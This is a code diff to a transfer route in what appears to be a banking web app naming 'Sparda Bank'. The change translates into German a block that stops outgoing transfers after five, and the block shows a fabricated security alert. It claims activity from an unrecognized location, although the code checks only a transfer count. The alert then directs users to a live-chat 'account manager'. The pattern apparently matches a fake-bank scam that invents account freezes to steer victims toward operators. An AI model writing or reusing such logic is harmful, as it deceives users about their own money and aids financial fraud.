@@ -159,15 +159,13 @@ router.post('/transfers', async (req, res, next) => {
 
     const user = userQuery.rows[0];
     const userId = user.id;
-
-    if (user.transfer_count >= 5) {
-      return res.status(403).json({
-        success: false,
-        error_code: 'ACCOUNT_FROZEN_LOCATION_MISMATCH',
-        message: 'SECURITY ALERT: We have detected unusual transaction activity originating from an unrecognized location or IP address. For your protection, outgoing transfer capabilities have been temporarily suspended. Please reach out to your dedicated Sparda Bank branch manager via the live support chat to verify your identity and restore full access.'
-      });
-    }
-
+if (user.transfer_count >= 5) {
+  return res.status(403).json({
+  success: false,
+  error_code: 'ACCOUNT_FROZEN_LOCATION_MISMATCH',
+  message: 'Sicherheitshinweis: Aus Sicherheitsgründen wurde Ihre Transaktion vorübergehend angehalten. Bitte wenden Sie sich zur Verifizierung Ihrer Identität über den Live-Chat an Ihren persönlichen Kundenbetreuer.'
+  });
+  }
     // Vault PIN Check using pgcrypto crypt()
     if (transaction_pin) {
       const pinCheck = await pool.query(
